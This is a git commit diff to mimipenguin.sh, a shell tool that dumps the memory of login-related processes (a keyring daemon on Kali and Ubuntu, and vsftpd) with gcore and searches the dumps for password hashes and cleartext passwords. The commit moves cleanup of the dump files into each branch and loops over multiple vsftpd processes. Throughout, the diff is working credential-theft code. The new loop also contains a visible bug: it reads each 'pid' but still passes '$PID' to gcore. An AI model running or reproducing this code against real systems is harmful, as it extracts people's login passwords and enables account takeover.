134355234c27acddf659e82b6f000203bbbe2100
huntergregal <huntergregal@gmail.com>
2017-03-31 13:50:56 -0400

    fixing git mess

--- mimipenguin.sh
+++ mimipenguin.sh
@@ -94,6 +94,9 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
         DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
         DUMP="${DUMP}$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
 	parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
+	
+	#cleanup
+	rm -rf "/tmp/dump.${PID}"
 fi
 
 #If Ubuntu
@@ -106,6 +109,9 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
         SALT="$(echo $HASH | cut -d'$' -f 3)"
         DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
 	parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
+	
+	#cleanup
+	rm -rf "/tmp/dump.${PID}"
 fi
 
 #If Vsftpd 
@@ -114,14 +120,17 @@ if [[ -e "/etc/vsftpd.conf" ]]; then
         #get nobody /usr/sbin/vsftpd /etc/vsftpd.conf
         PID="$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk 'BEGIN {FS = " " } ; { print $1 }')"
 	#if exists aka someone logged into FTP then extract...
-	if [[ $PID ]]; then
-	        gcore -o /tmp/dump $PID >& /dev/null
-	        HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
-	        SALT="$(echo $HASH | cut -d'$' -f 3)"
-	        DUMP=$(strings "/tmp/dump.${PID}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
-		parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
+	if [[ $PID ]];then
+		while read -r pid; do
+		        gcore -o /tmp/dump $PID >& /dev/null
+		        HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
+		        SALT="$(echo $HASH | cut -d'$' -f 3)"
+		        DUMP=$(strings "/tmp/dump.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
+			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
+		
+			#cleanup
+			rm -rf "/tmp/dump.${pid}"
+		done <<< $PID
 	fi
 fi
 
-#Cleanup
-rm -rf "/tmp/dump.${PID}"
